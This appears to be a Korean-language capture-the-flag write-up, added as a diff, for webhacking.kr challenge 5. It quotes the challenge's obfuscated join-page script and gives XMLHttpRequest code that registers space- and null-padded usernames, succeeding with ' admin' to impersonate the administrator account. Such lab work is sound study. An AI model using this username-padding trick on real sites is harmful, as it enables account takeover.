@@ -1,0 +1,62 @@
+무지성으로 아래 url 접근
+https://webhacking.kr/challenge/web-05/mem/join.php
+들어가서 스크립트 뜯어보면
+
+<html>
+<title>Challenge 5</title></head><body bgcolor=black><center>
+<script>
+l='a';ll='b';lll='c';llll='d';lllll='e';llllll='f';lllllll='g';llllllll='h';lllllllll='i';llllllllll='j';lllllllllll='k';
+llllllllllll='l';lllllllllllll='m';llllllllllllll='n';lllllllllllllll='o';llllllllllllllll='p';lllllllllllllllll='q';
+llllllllllllllllll='r';lllllllllllllllllll='s';llllllllllllllllllll='t';lllllllllllllllllllll='u';llllllllllllllllllllll='v';
+lllllllllllllllllllllll='w';llllllllllllllllllllllll='x';lllllllllllllllllllllllll='y';llllllllllllllllllllllllll='z';
+I='1';II='2';III='3';IIII='4';IIIII='5';IIIIII='6';IIIIIII='7';IIIIIIII='8';IIIIIIIII='9';IIIIIIIIII='0';li='.';ii='<';iii='>';
+
+lIllIllIllIllIllIllIllIllIllIl = oldzombie;
+lIIIIIIIIIIIIIIIIIIl = document.cookie;
+
+if(eval(lIIIIIIIIIIIIIIIIIIl).indexOf(lIllIllIllIllIllIllIllIllIllIl)==-1) {
+    alert('bye');
+    throw "stop";
+}
+
+if(eval('document.URL').indexOf('mode=1')==-1){
+    alert('access_denied');
+    throw "stop";
+}else{
+    document.write('<font size=2 color=white>Join</font><p>');
+    document.write('.<p>.<p>.<p>.<p>.<p>');
+    document.write('<form method=post action='+llllllllll+lllllllllllllll+lllllllll+llllllllllllll+li+llllllllllllllll+llllllll+llllllllllllllll+'>');
+    document.write('<table border=1><tr><td><font color=gray>id</font></td><td><input type=text name='+lllllllll+llll+' maxlength=20></td></tr>');
+    document.write('<tr><td><font color=gray>pass</font></td><td><input type=text name='+llllllllllllllll+lllllllllllllllllllllll+'></td></tr>');
+    document.write('<tr align=center><td colspan=2><input type=submit></td></tr></form></table>');}
+</script>
+</body>
+</html>
+
+쿠키값과 url에 mode=1을 넣어주면 회원가입 노출
+-----> 회원가입한 계정으로 로그인하면 admin으로 시도하라함ㅋㅋㅋ ㅅㅂ
+
+var xhr = new XMLHttpRequest();
+
+xhr.open('POST', 'https://webhacking.kr/challenge/web-05/mem/join.php', true);
+
+var data = new FormData();
+data.append('id', 'admin%20%20%20%00'); 
+data.append('pw', 'admin'); 
+
+xhr.send(data);
+
+xhr.onload = () => {
+    console.log(xhr.response);
+}
+
+안되서 찾아보니 다들 프로그램써서 뒤에다가 공백과 null을 붙여 가입을 시도했는데 스크립트로 안됨 
+로그인 시도해보면 %20%00 통짜로 계정이 생성
+admin1 이것도 실패
+
+뒤에만 짜르는지 [공백]admin 으로 가입 후 로그인하면 성공
+var data = new FormData();
+data.append('id', ' admin'); 
+data.append('pw', 'admin');
+
+php에서 체크를 어떻게 하는지 궁금하네...
